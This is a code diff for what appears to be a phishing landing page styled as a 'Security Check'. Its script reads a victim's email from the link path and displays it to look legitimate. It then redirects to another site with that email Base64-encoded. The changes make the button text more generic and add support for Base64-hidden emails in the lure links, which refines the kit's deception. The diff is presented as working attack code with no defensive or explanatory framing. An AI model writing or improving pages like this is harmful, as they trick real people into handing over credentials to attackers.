@@ -15,26 +15,50 @@
 <body>
     <div class="box">
         <h2 style="color: #1a365d;">Security Check</h2>
-        <p style="color: #4a5568;">This document is intended for:<br><span id="email-display">Loading...</span></p>
+        <p style="color: #4a5568;">This action is intended for:<br><span id="email-display">Loading...</span></p>
         <p style="color: #4a5568; font-size: 14px;">Please click below to verify your identity.</p>
-        <button class="btn" onclick="jump()">Verify & View Document</button>
+        <button class="btn" onclick="jump()">Click Here To Continue</button>
     </div>
 
     <script>
-        // Function to extract email from the URL path
+        // --- NEW: Function to check if a string is valid Base64 ---
+        function isBase64(str) {
+            try {
+                // Check if it's a valid Base64 string by attempting to decode and re-encode
+                return btoa(atob(str)) === str;
+            } catch (err) {
+                return false;
+            }
+        }
+
+        // --- MODIFIED: Function to extract and decode email from the URL path ---
         function getEmailFromUrl() {
-            // Get the full path: e.g., "/random123/abc456/john%40example.com"
+            // Get the full path: e.g., "/kkk/prnnyvh/dGVzdEBhYmMuY29t" or "/kkk/prnnyvh/test%40abc.com"
             const path = window.location.pathname;
             
             // Split by '/' and get the last part
             const parts = path.split('/');
             const lastPart = parts[parts.length - 1];
             
-            // Decode the URL-encoded email (converts %40 back to @)
+            // 1. Try to decode as Base64 first
+            if (isBase64(lastPart)) {
+                try {
+                    const decodedEmail = atob(lastPart); // Decode from Base64 to plain text
+                    console.log("Decoded from Base64:", decodedEmail);
+                    return decodedEmail;
+                } catch (e) {
+                    console.log("Base64 decoding failed, trying URL decode...");
+                }
+            }
+            
+            // 2. If not Base64 or Base64 failed, try URL decoding (for %40 format)
             try {
-                return decodeURIComponent(lastPart);
+                const decodedEmail = decodeURIComponent(lastPart);
+                console.log("Decoded from URL encoding:", decodedEmail);
+                return decodedEmail;
             } catch (e) {
-                return "email@example.com"; // Fallback if decoding fails
+                console.log("URL decoding failed, using fallback.");
+                return "email@example.com"; // Final fallback
             }
         }
 
@@ -43,11 +67,11 @@
         document.getElementById('email-display').textContent = userEmail;
 
         // Optional: Log for debugging (remove in production)
-        console.log("Email from URL:", userEmail);
+        console.log("Final email to display:", userEmail);
         console.log("Full URL path:", window.location.pathname);
 
         function jump() {
-            // Encode the dynamic email to Base64
+            // Encode the dynamic email to Base64 for the redirect
             const b64 = btoa(userEmail);
             
             // Your target URL with the encoded email
